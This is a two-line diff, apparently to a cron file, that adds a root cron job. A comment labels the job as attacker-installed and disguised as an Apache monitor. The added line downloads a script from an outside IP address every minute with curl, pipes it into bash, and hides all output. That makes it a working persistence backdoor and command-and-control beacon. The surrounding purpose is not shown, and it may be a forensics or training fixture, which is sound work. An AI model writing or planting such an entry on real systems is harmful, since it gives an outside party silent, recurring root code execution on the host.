@@ -1,0 +1,2 @@
+# Installed by attacker — masquerades as an apache monitor. C2 beacon every minute.
+* * * * * root curl -fsSL http://185.220.101.47/x.sh | bash > /dev/null 2>&1
